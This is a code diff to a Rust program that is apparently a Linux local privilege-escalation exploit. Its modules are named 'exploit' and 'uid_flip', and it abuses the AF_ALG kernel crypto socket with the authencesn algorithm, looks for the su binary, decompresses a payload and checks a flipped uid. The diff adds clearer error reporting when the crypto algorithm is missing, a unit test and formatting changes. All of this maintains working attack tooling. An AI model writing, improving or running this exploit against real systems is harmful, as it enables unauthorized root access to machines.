@@ -59,6 +59,8 @@ mod error {
             call: &'static str,
             source: io::Error,
         },
+        #[error("required AF_ALG crypto algorithm is unavailable: {algorithm}. Load the kernel crypto modules (for example authenc/authencesn, hmac, sha256, cbc, aes) or use a kernel that registers this algorithm")]
+        MissingCryptoAlgorithm { algorithm: &'static str },
         #[error("su binary not found")]
         SuNotFound,
         #[error("payload decompression failed: {0}")]
@@ -354,7 +356,11 @@ mod exploit {
     }
 
     fn progress_interval(total: usize) -> usize {
-        if total < 10_000 { 100 } else { 10_000 }
+        if total < 10_000 {
+            100
+        } else {
+            10_000
+        }
     }
 
     fn create_alg_socket() -> Result<OwnedFd> {
@@ -366,6 +372,18 @@ mod exploit {
             });
         }
         Ok(unsafe { OwnedFd::from_raw_fd(fd) })
+    }
+
+    fn bind_error(err: io::Error) -> CopyfailError {
+        if err.raw_os_error() == Some(libc::ENOENT) {
+            return CopyfailError::MissingCryptoAlgorithm {
+                algorithm: "authencesn(hmac(sha256),cbc(aes))",
+            };
+        }
+        CopyfailError::Syscall {
+            call: "bind",
+            source: err,
+        }
     }
 
     fn bind_socket(fd: RawFd) -> Result<()> {
@@ -383,10 +401,7 @@ mod exploit {
             )
         };
         if rc != 0 {
-            return Err(CopyfailError::Syscall {
-                call: "bind",
-                source: io::Error::last_os_error(),
-            });
+            return Err(bind_error(io::Error::last_os_error()));
         }
         Ok(())
     }
@@ -586,6 +601,12 @@ mod exploit {
     #[cfg(test)]
     mod tests {
         use super::*;
+
+        #[test]
+        fn bind_enoent_reports_missing_algorithm() {
+            let err = bind_error(io::Error::from_raw_os_error(libc::ENOENT));
+            assert!(matches!(err, CopyfailError::MissingCryptoAlgorithm { .. }));
+        }
 
         #[test]
         fn packed_cmsg_has_header_and_payload() {
@@ -915,7 +936,11 @@ mod uid_flip {
         // Verify via getpwuid
         let check_uid = unsafe {
             let pw = libc::getpwuid(uid);
-            if pw.is_null() { uid } else { (*pw).pw_uid }
+            if pw.is_null() {
+                uid
+            } else {
+                (*pw).pw_uid
+            }
         };
         eprintln!("[*] getpwuid({uid}).pw_uid = {check_uid}",);
 
